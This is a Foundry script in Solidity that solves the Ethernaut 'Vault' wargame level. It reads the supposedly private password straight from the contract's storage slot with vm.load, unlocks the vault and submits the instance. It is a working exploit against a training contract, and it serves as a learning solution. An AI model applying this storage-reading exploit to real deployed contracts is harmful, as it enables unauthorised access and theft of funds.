// SPDX-License-Identifier: MIT

pragma solidity ^0.8.18;

import {Script} from "forge-std/Script.sol";
import {Vault} from "src/08/Vault.sol";
import {VaultFactory} from "src/08/VaultFactory.sol";
import {Ethernaut} from "src/Ethernaut.sol";
import {HelperConfig} from "../HelperConfig.s.sol";
import {console, Test} from "forge-std/Test.sol";

contract VaultExploit is Script {
    address public levelFactory;
    HelperConfig public config;

    function run() external {
        if (block.chainid == 11155111) {
            levelFactory = vm.envAddress("LEVEL8_SEPOLIA_ADDRESS");
        } else {
            levelFactory = address(new VaultFactory());
        }
        // Deploy a new instance using the level Address
        config = new HelperConfig(levelFactory);
        (address ethernaut, address payable instance, uint256 deployerKey) = config.activeNetworkConfig();

        vm.startBroadcast(deployerKey);

        // Break the contract
        bytes32 password = vm.load(instance, bytes32(uint256(1)));
        Vault(instance).unlock(password);

        // Submit results
        Ethernaut(ethernaut).submitLevelInstance(instance);
        (,, bool completed) = Ethernaut(ethernaut).emittedInstances(instance);
        require(completed == true, "Solution is not solving the level");

        vm.stopBroadcast();
    }
}
